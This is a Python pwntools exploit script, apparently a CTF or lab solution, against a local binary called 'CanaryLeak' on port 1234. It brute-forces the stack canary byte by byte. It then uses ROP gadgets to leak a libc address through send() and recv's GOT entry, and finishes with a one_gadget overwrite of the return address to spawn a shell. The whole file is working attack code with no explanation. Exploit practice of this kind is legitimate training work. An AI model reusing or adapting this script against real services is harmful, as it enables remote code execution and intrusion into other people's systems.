from pwn import *
from socket import *

p = remote('127.0.0.1', 1234)
e = ELF('CanaryLeak')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

# Canary Leak
def find_canary_byte(known_canary):
    for unknown_byte in range(0x100):
        p.sock = socket(AF_INET, SOCK_STREAM)
        p.sock.connect(('127.0.0.1', 1234))
        p.sock.settimeout(1)

        canary = known_canary
        canary += p8(unknown_byte)

        payload = b'A' * 0x108
        payload += canary

        p.sock.recv(5) # 'MSG: '
        p.sock.send(payload)
        
        resp = p.sock.recv(4)
        p.sock.close()

        if resp == b'BYE\x00':
            return canary

canary = b''
for i in range(8):
    canary = find_canary_byte(canary)

print("canary found!")
print(canary)


# ROP & One_shot

# gadgets
pop_rdi = 0x00400a23
pop_rsi_r15 = 0x00400a21
ret = 0x000000000040066e

one_gadget = 0x4f302 # constrains is that rsp+0x40 is null
pop_r12_r13_r14_r15 = 0x0000000000400a1c

recv_got = e.got['recv']
recv_plt = e.plt['recv']

send_plt = e.plt['send']
send_got = e.got['send']

# Exploit
p.sock = socket(AF_INET, SOCK_STREAM)
p.sock.connect(("127.0.0.1", 1234))

payload = b'A'*0x108 + canary + b'A'*0x8

# send(fd, recv_got, ?, ?)
payload += p64(pop_rsi_r15) + p64(recv_got) + p64(0)
payload += p64(send_plt)

p.sock.recv(5) # 'MSG: '
p.sock.send(payload)


recv = p.sock.recv(8)
print(recv)

# bacause parameters of the send function have not been accurately setted, sometimes recieve b''
if recv == b'':
    print('\nRestart server(CanaryLeak) and retry')
    exit(0)

# calculate recv addr and libc_base
recv = u64(recv)
libc_base = recv - libc.symbols['recv']
system = libc.symbols['system'] + libc_base

print('recv got: ', end='')
print(hex(recv_got))

print('recv: ', end='')
print(hex(recv))

print("system: ", end='')
print(hex(system))

print("libc_base: ", end='')
print(hex(libc_base))

p.sock.close()

# exploit using one_shot gadget
p.sock = socket(AF_INET, SOCK_STREAM)
p.sock.connect(("127.0.0.1", 1234))

payload = b'A'*0x108 + canary + b'A'*0x8
payload += p64(one_gadget+libc_base)
payload += p64(0)*0x40

p.sock.send(payload)

print('\npwned!')